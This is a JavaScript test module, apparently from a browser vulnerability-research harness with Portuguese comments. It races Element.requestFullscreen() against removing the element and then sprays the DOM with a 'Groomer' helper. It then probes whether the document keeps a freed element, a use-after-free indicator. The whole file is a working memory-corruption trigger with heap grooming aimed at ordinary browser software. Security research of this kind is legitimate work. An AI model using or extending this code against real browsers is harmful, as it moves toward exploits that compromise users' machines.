import { Groomer } from '../mod_groomer.js';

export default {
    id:       'FULLSCREEN_API_RACE',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'Condição de corrida na Promise do Element.requestFullscreen(). ' +
        'Iniciamos a transição e, durante a microtask de rejeição/aceitação, ' +
        'destruímos o elemento e esburacamos a árvore de renderização (RenderTree).',

    setup: function() {
        this.results = {};
        this.div = document.createElement('div');
        this.div.innerHTML = '<video></video><iframe></iframe>';
        document.body.appendChild(this.div);
    },

    trigger: function() {
        const self = this;
        try {
            // Iniciamos o pedido assíncrono. O C++ começa a preparar a RenderTree.
            let promise = this.div.requestFullscreen ? this.div.requestFullscreen() : 
                         (this.div.webkitRequestFullscreen ? this.div.webkitRequestFullscreen() : null);
            
            if (promise && promise.catch) {
                // Durante a resolução do Event Loop, esburacamos a memória!
                promise.catch(e => {
                    self.results.promiseRejected = true;
                    self.div.innerHTML = ''; // Destrói os filhos mid-transition
                });
            }

            // Destruição síncrona na Main Thread para bater de frente com a Promise
            this.div.remove();
            
            let trash = Groomer.sprayDOM('div', 500);

        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O C++ rejeitou a Promise ou perdeu o rasto dela?
        s => s.results.promiseRejected ? 'Rejeitada' : 'Perdida no Limbo',
        
        // Probe 1: O Documento ainda acha que tem um elemento em Fullscreen? (Memory Leak / UAF)
        s => {
            let fsElement = document.fullscreenElement || document.webkitFullscreenElement;
            if (fsElement === s.div) {
                return '💥 ANOMALIA: Elemento Freed retido pelo Documento!';
            }
            return 'Documento Limpo';
        }
    ],

    cleanup: function() {
        try { this.div.remove(); } catch(e){}
        if (document.exitFullscreen) document.exitFullscreen().catch(e=>{});
        else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
        this.div = null;
        this.results = {};
    }
};
